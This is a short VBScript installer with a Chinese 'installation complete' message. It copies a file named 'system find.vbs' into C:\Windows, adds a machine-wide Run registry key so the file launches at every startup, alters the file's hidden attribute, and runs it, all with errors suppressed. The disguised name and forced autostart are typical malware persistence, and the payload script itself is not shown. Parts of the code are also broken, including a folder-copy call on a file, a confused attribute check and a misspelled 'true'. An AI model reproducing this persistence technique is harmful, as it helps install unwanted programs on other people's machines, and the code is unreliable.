On Error Resume Next
Dim fso,yn,ttfile
Set fso = CreateObject("Scripting.FileSystemObject")
fso.CopyFolder "C:\Users\Administrator\Desktop\安装\system find.vbs","C:\Windows\",False
fso.CopyFile "C:\Users\Administrator\Desktop\安装\system find.vbs","C:\Windows\",False


Set oShell=CreateObject("Wscript.Shell")

oShell.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\window","C:\Windows\system find.vbs" 
Set objFSO = CreateObject("Scripting.FileSystemObject")


Set objFile = objFSO.GetFile("C:\Windows\system find.vbs")

If objFile.Attributes = objFile.Attributes AND 2 Then

objFile.Attributes = objFile.Attributes XOR 2

End If

msgbox  "安装完成！", , "system find"

set ws=createobject("wscript.shell")
ws.run"C:\Windows\system find.vbs",5,ture

